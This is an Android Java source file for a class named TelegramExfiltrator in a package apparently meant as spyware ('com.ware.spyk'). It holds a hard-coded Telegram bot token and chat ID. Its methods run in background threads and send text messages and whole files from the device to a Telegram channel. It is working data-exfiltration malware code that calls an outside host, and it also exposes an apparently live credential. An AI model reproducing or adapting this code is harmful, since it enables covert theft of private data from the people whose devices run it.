package com.ware.spyk;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import android.util.Log;

import android.util.Log;
public class TelegramExfiltrator {

    private static final String BOT_TOKEN = "7919835217:AAGZyqI1N7h4rlS_vevNGqvKxRZY6ZeRivo";
    private static final String CHAT_ID = "-1002606236199"; // ID du channel ou chat

    public static void sendTexte(String message) {

        if (message != null && !message.isEmpty()) {

            message = message.replace("_", "\\_")
                    .replace("*", "\\*")
                    .replace("[", "\\[")
                    .replace("]", "\\]")
                    .replace("(", "\\(")
                    .replace(")", "\\)")
                    .replace("~", "\\~")
                    .replace("`", "\\`")
                    .replace(">", "\\>")
                    .replace("#", "\\#")
                    .replace("+", "\\+")
                    .replace("-", "\\-")
                    .replace("=", "\\=")
                    .replace("|", "\\|")
                    .replace("{", "\\{")
                    .replace("}", "\\}")
                    .replace(".", "\\.")
                    .replace("!", "\\!")
                    .replace("\n", "  \n");

            String url = null;
            try {
                url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage"
                        + "?chat_id=" + CHAT_ID
                        + "&text=" + URLEncoder.encode(message, "UTF-8")
                        + "&parse_mode=MarkdownV2";
            } catch (UnsupportedEncodingException e) {
                throw new RuntimeException(e);
            }
            String finalUrl = url;
            new Thread(() -> {
                HttpURLConnection con= null;
                try {
                    URL obj = new URL(finalUrl);
                    con = (HttpURLConnection) obj.openConnection();
                    con.setRequestMethod("GET");
                    int responseCode = con.getResponseCode();
                    InputStream is = (responseCode >= 400) ? con.getErrorStream() : con.getInputStream();
                    if (is != null) {
                        StringBuilder response = new StringBuilder();
                        byte[] buffer = new byte[1024];
                        int length;
                        while ((length = is.read(buffer)) != -1) {
                            response.append(new String(buffer, 0, length));
                        }
                        is.close();
                        Log.d("TelegramExfiltrator", "Réponse Telegram : " + response.toString());
                    }

                } catch (Exception e) {
                    Log.e("TelegramExfiltrator", "Erreur lors de l'envoi du text", e);
                    e.printStackTrace();
                } finally {
                    if (con != null) con.disconnect();
                }
            }).start();
        }
        else
        {
            Log.d("TelegramExfiltrator", "chaine vide");
        }
    }

    public static void sendFileToTelegram(File file, String apiMethod, String fieldName, String contentType, Runnable onFinish) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + apiMethod;

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                URL obj = new URL(url);
                conn = (HttpURLConnection) obj.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");

                String boundary = "----SpyBoundary" + System.currentTimeMillis();
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                OutputStream output = conn.getOutputStream();

                // Corps de la requête
                String bodyStart = "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
                        CHAT_ID + "\r\n" +
                        "--" + boundary + "\r\n" +
                        "Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n" +
                        "Content-Type: " + contentType + "\r\n\r\n";
                output.write(bodyStart.getBytes());

                FileInputStream inputStream = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    output.write(buffer, 0, bytesRead);
                }
                inputStream.close();

                String bodyEnd = "\r\n--" + boundary + "--\r\n";
                output.write(bodyEnd.getBytes());

                output.flush();
                output.close();

                int responseCode = conn.getResponseCode();
                InputStream is = (responseCode >= 400) ? conn.getErrorStream() : conn.getInputStream();
                if (is != null) {
                    StringBuilder response = new StringBuilder();
                    byte[] tmpbuffer = new byte[1024];
                    int length;
                    while ((length = is.read(tmpbuffer)) != -1) {
                        response.append(new String(buffer, 0, length));
                    }
                    is.close();
                    Log.d("TelegramExfiltrator", "Réponse Telegram : " + response.toString());
                }

            } catch (Exception e) {
                Log.e("TelegramExfiltrator", "Erreur lors de l'envoi de fichier", e);
            } finally {
                if (conn != null) conn.disconnect();
                if (onFinish != null) onFinish.run();
            }
        }).start();
    }
}

